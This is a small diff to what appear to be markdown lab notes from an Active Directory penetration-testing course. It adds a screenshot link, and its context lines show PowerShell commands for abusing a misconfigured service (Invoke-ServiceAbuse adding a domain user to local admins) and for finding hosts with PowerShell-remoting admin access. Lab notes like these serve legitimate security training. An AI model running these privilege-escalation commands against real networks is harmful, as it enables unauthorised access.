@@ -149,3 +149,4 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student115' -Verbose
 ```powershell
 Find-PSremotingLocalAdminAccess -verbose
 ```
+![[Pasted image 20231018151010.png]]
